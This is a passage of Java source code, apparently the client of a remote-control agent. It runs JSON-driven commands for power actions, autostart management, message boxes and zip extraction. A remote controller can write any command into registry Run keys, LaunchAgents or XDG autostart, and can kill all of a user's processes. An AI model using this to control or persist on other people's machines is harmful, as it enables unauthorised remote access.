        switch (vk) {
            case 0xBC: return shift?"<":","; case 0xBE: return shift?">":".";
            case 0xBF: return shift?"?":"/"; case 0xC0: return shift?"~":"`";
            case 0xDB: return shift?"{":" ["; case 0xDC: return shift?"|":"\\";
            case 0xDD: return shift?"}":"]"; case 0xDE: return shift?"\"":"'";
            case 0xBB: return shift?"+":"="; case 0xBD: return shift?"_":"-";
            case 0xBA: return shift?":":";";
        }
        return null;
    }

    private static void sendOthersError(String op, String err) {
        JSONObject e = new JSONObject();
        e.put("cmd","others:error"); e.put("op",op); e.put("error",err); send(e);
    }

    // === ADVANCED: POWER CONTROLS ===

    private static void handlePowerAction(JSONObject msg) {
        String action = msg.optString("action","");
        JSONObject result = new JSONObject();
        result.put("cmd","power:result"); result.put("action",action);
        try {
            String os = System.getProperty("os.name").toLowerCase();
            // Build the command list then run — avoids "pb may not be initialized" compiler error
            List<String> cmd;
            if (os.contains("win")) {
                switch (action) {
                    case "shutdown":    cmd = Arrays.asList("shutdown","/s","/t","5"); break;
                    case "restart":     cmd = Arrays.asList("shutdown","/r","/t","5"); break;
                    case "sleep":       cmd = Arrays.asList("rundll32.exe","powrprof.dll,SetSuspendState","0,1,0"); break;
                    case "lock_screen": cmd = Arrays.asList("rundll32.exe","user32.dll,LockWorkStation"); break;
                    case "log_off":     cmd = Arrays.asList("shutdown","/l"); break;
                    default: throw new IllegalArgumentException("Unknown action: "+action);
                }
            } else if (os.contains("mac")||os.contains("darwin")) {
                switch (action) {
                    case "shutdown":    cmd = Arrays.asList("osascript","-e","tell app \"System Events\" to shut down"); break;
                    case "restart":     cmd = Arrays.asList("osascript","-e","tell app \"System Events\" to restart"); break;
                    case "sleep":       cmd = Arrays.asList("pmset","sleepnow"); break;
                    case "lock_screen": cmd = Arrays.asList("open","-a","ScreenSaverEngine"); break;
                    case "log_off":     cmd = Arrays.asList("osascript","-e","tell app \"System Events\" to log out"); break;
                    default: throw new IllegalArgumentException("Unknown action: "+action);
                }
            } else {
                switch (action) {
                    case "shutdown":    cmd = Arrays.asList("systemctl","poweroff"); break;
                    case "restart":     cmd = Arrays.asList("systemctl","reboot"); break;
                    case "sleep":       cmd = Arrays.asList("systemctl","suspend"); break;
                    case "lock_screen": cmd = Arrays.asList("loginctl","lock-session"); break;
                    case "log_off":     cmd = Arrays.asList("pkill","-KILL","-u",System.getProperty("user.name")); break;
                    default: throw new IllegalArgumentException("Unknown action: "+action);
                }
            }
            new ProcessBuilder(cmd).redirectErrorStream(true).start();
            result.put("success", true);
        } catch (Exception e) { result.put("success",false); result.put("error",e.getMessage()); }
        send(result);
    }

    // === ADVANCED: STARTUP MANAGER ===

    private static void handleStartupList(JSONObject msg) {
        JSONObject result = new JSONObject();
        result.put("cmd","startup:list_data");
        JSONArray entries = new JSONArray();
        String os = System.getProperty("os.name").toLowerCase();
        try {
            if (os.contains("win")) {
                for (String hive : new String[]{
                        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"}) {
                    String hiveLabel = hive.startsWith("HKCU") ? "HKCU Run" : "HKLM Run";
                    Process p = new ProcessBuilder("reg","query",hive)
                        .redirectErrorStream(true).start();
                    p.waitFor(10, TimeUnit.SECONDS);
                    try (java.io.BufferedReader r = new java.io.BufferedReader(
                            new java.io.InputStreamReader(p.getInputStream()))) {
                        String line;
                        while ((line=r.readLine())!=null) {
                            line=line.trim();
                            if (line.isEmpty()||line.startsWith("HKEY")) continue;
                            String[] pts = line.split("\\s+REG_SZ\\s+",2);
                            if (pts.length==2) {
                                JSONObject e = new JSONObject();
                                e.put("name",pts[0].trim()); e.put("command",pts[1].trim()); e.put("type",hiveLabel);
                                entries.put(e);
                            }
                        }
                    }
                }
            } else if (os.contains("mac")||os.contains("darwin")) {
                java.io.File dir = new java.io.File(System.getProperty("user.home")+"/Library/LaunchAgents");
                if (dir.exists()) {
                    java.io.File[] plists = dir.listFiles((d,n)->n.endsWith(".plist"));
                    if (plists!=null) for (java.io.File f : plists) {
                        JSONObject e = new JSONObject();
                        e.put("name",f.getName().replace(".plist","")); e.put("command",f.getAbsolutePath()); e.put("type","LaunchAgent");
                        entries.put(e);
                    }
                }
            } else {
                java.io.File dir = new java.io.File(System.getProperty("user.home")+"/.config/autostart");
                if (dir.exists()) {
                    java.io.File[] desktops = dir.listFiles((d,n)->n.endsWith(".desktop"));
                    if (desktops!=null) for (java.io.File f : desktops) {
                        String name=f.getName().replace(".desktop",""), exec="";
                        for (String line : Files.readAllLines(f.toPath())) {
                            if (line.startsWith("Name=")) name=line.substring(5).trim();
                            if (line.startsWith("Exec=")) exec=line.substring(5).trim();
                        }
                        JSONObject e = new JSONObject();
                        e.put("name",name); e.put("command",exec); e.put("type","XDG Autostart");
                        entries.put(e);
                    }
                }
            }
        } catch (Exception e) { result.put("error",e.getMessage()); }
        result.put("entries",entries);
        send(result);
    }

    private static void handleStartupAdd(JSONObject msg) {
        String name = msg.getString("name"), command = msg.getString("command");
        JSONObject result = new JSONObject();
        result.put("cmd","startup:changed");
        String os = System.getProperty("os.name").toLowerCase();
        try {
            if (os.contains("win")) {
                Process p = new ProcessBuilder("reg","add",
                    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "/v",name,"/t","REG_SZ","/d",command,"/f")
                    .redirectErrorStream(true).start();
                boolean ok = p.waitFor(10,TimeUnit.SECONDS);
                result.put("success", ok && p.exitValue()==0);
                if (!ok||p.exitValue()!=0) result.put("error",new String(p.getInputStream().readAllBytes()).trim());
            } else if (os.contains("mac")||os.contains("darwin")) {
                java.io.File f = new java.io.File(System.getProperty("user.home")+"/Library/LaunchAgents/"+name+".plist");
                f.getParentFile().mkdirs();
                String plist = "<?xml version=\"1.0\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\"><dict><key>Label</key><string>"+name+"</string><key>ProgramArguments</key><array><string>"+command+"</string></array><key>RunAtLoad</key><true/></dict></plist>\n";
                Files.write(f.toPath(), plist.getBytes(java.nio.charset.StandardCharsets.UTF_8));
                result.put("success",true);
            } else {
                java.io.File f = new java.io.File(System.getProperty("user.home")+"/.config/autostart/"+name+".desktop");
                f.getParentFile().mkdirs();
                String desktop = "[Desktop Entry]\nType=Application\nName="+name+"\nExec="+command+"\nHidden=false\nX-GNOME-Autostart-enabled=true\n";
                Files.write(f.toPath(), desktop.getBytes(java.nio.charset.StandardCharsets.UTF_8));
                result.put("success",true);
            }
        } catch (Exception e) { result.put("success",false); result.put("error",e.getMessage()); }
        send(result);
    }

    private static void handleStartupRemove(JSONObject msg) {
        String name = msg.getString("name"), type = msg.optString("type","");
        JSONObject result = new JSONObject();
        result.put("cmd","startup:changed");
        String os = System.getProperty("os.name").toLowerCase();
        try {
            if (os.contains("win")) {
                String hive = type.contains("HKLM")
                    ? "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                    : "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
                Process p = new ProcessBuilder("reg","delete",hive,"/v",name,"/f")
                    .redirectErrorStream(true).start();
                boolean ok = p.waitFor(10,TimeUnit.SECONDS);
                result.put("success", ok && p.exitValue()==0);
            } else if (os.contains("mac")||os.contains("darwin")) {
                result.put("success", new java.io.File(System.getProperty("user.home")+"/Library/LaunchAgents/"+name+".plist").delete());
            } else {
                result.put("success", new java.io.File(System.getProperty("user.home")+"/.config/autostart/"+name+".desktop").delete());
            }
        } catch (Exception e) { result.put("success",false); result.put("error",e.getMessage()); }
        send(result);
    }

    // === ADVANCED: MESSAGE BOX ===

    private static void handleMsgBox(JSONObject msg) {
        String title   = msg.optString("title",   "Alert");
        String message = msg.optString("message", "");
        String type    = msg.optString("type",     "Information");

        // Acknowledge immediately so the UI doesn't wait
        JSONObject result = new JSONObject();
        result.put("cmd", "msgbox:result");
        result.put("success", true);
        send(result);

        // Show in a background thread so we never block the command reader
        new Thread(() -> {
            String os = System.getProperty("os.name").toLowerCase();
            // Primary: use the OS native dialog — guaranteed to work in console apps
            // (no Swing EDT required, no AWT initialization needed)
            if (os.contains("win")) {
                showMsgBoxWindows(title, message, type);
            } else if (os.contains("mac") || os.contains("darwin")) {
                showMsgBoxMac(title, message, type);
            } else {
                showMsgBoxLinux(title, message, type);
            }
        }, "msgbox").start();
    }

    private static void showMsgBoxWindows(String title, String message, String type) {
        // Write a temp .vbs file and run with wscript — avoids all command-line quoting hell.
        // wscript.exe is built into every Windows version since Windows 98.
        // VBScript MsgBox button+icon flags: 0=OK only, icons: 16=Error, 32=Question, 48=Warning, 64=Info
        int icon;
        switch (type) {
            case "Error":    icon = 16; break;
            case "Question": icon = 32; break;
            case "Warning":  icon = 48; break;
            default:         icon = 64; break;
        }
        try {
            java.io.File vbs = java.io.File.createTempFile("aonmsg_", ".vbs");
            vbs.deleteOnExit();
            // In VBScript, double a quote to escape it inside a string literal ("" = ")
            String safeMsg   = message.replace("\"", "\"\"")
                                      .replace("\r\n", "\" & vbCrLf & \"")
                                      .replace("\n",   "\" & vbCrLf & \"");
            String safeTitle = title.replace("\"", "\"\"");
            String script    = "MsgBox \"" + safeMsg + "\"," + icon + ",\"" + safeTitle + "\"";
            java.nio.file.Files.write(vbs.toPath(),
                script.getBytes(java.nio.charset.StandardCharsets.UTF_8));
            new ProcessBuilder("wscript", "/nologo", vbs.getAbsolutePath())
                .redirectErrorStream(true).start().waitFor(30, TimeUnit.SECONDS);
            vbs.delete();
        } catch (Exception e) {
            System.err.println("[MsgBox] wscript failed: " + e.getMessage());
            showMsgBoxSwing(title, message, type);
        }
    }

    private static void showMsgBoxMac(String title, String message, String type) {
        // osascript is built into every macOS
        String safe    = message.replace("\"", "\\\"").replace("\n", "\\n");
        String safeT   = title.replace("\"", "\\\"");
        String icon    = type.equals("Warning") || type.equals("Error") ? " with icon caution" : "";
        try {
            new ProcessBuilder("osascript", "-e",
                "display dialog \"" + safe + "\" with title \"" + safeT
                + "\" buttons {\"OK\"}" + icon)
                .start().waitFor(30, TimeUnit.SECONDS);
        } catch (Exception e) {
            System.err.println("[MsgBox] osascript failed: " + e.getMessage());
            showMsgBoxSwing(title, message, type);
        }
    }

    private static void showMsgBoxLinux(String title, String message, String type) {
        // Try zenity → notify-send → xmessage in order
        String safeMsg = message.replace("\"","'");
        String safeT   = title.replace("\"","'");
        String[][] cmds = {
            {"zenity", "--info", "--title=" + safeT, "--text=" + safeMsg},
            {"notify-send", safeT, safeMsg},
            {"xmessage", "-center", safeT + ": " + safeMsg},
        };
        for (String[] cmd : cmds) {
            try {
                Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
                p.waitFor(30, TimeUnit.SECONDS);
                return; // first one that doesn't throw is good enough
            } catch (Exception ignored) {}
        }
        // All native tools failed — fall back to Swing
        showMsgBoxSwing(title, message, type);
    }

    private static void showMsgBoxSwing(String title, String message, String type) {
        // Last-resort fallback: Swing dialog on the EDT.
        // Works when the JVM already has a GUI context; may fail in purely headless envs.
        final int jType;
        switch (type) {
            case "Warning":  jType = javax.swing.JOptionPane.WARNING_MESSAGE;  break;
            case "Error":    jType = javax.swing.JOptionPane.ERROR_MESSAGE;    break;
            case "Question": jType = javax.swing.JOptionPane.QUESTION_MESSAGE; break;
            default:         jType = javax.swing.JOptionPane.INFORMATION_MESSAGE;
        }
        try {
            javax.swing.SwingUtilities.invokeAndWait(() ->
                javax.swing.JOptionPane.showMessageDialog(null, message, title, jType));
        } catch (Exception e) {
            System.err.println("[MsgBox] Swing fallback also failed: " + e.getMessage());
        }
    }

    // === EXTRACT ===

    private static void handleExtract(JSONObject msg) {
        String zipPath = msg.getString("path");
        String destDir = msg.getString("dest");
        JSONObject result = new JSONObject();
        result.put("cmd", "fs:extract_result");
        result.put("dest", destDir);
        try {
            Path destPath = Paths.get(destDir);
            Files.createDirectories(destPath);
            try (ZipInputStream zis = new ZipInputStream(new FileInputStream(zipPath))) {
                ZipEntry entry;
                while ((entry = zis.getNextEntry()) != null) {
                    Path entryPath = destPath.resolve(entry.getName()).normalize();
                    if (!entryPath.startsWith(destPath)) {
                        throw new IOException("Zip entry outside target directory: " + entry.getName());
                    }
                    if (entry.isDirectory()) {
                        Files.createDirectories(entryPath);
                    } else {
                        Files.createDirectories(entryPath.getParent());
                        Files.copy(zis, entryPath, StandardCopyOption.REPLACE_EXISTING);
                    }
                    zis.closeEntry();
                }
            }
            result.put("success", true);
        } catch (Exception e) {
            result.put("success", false);
            result.put("error", e.getMessage());
        }
        send(result);
    }

}
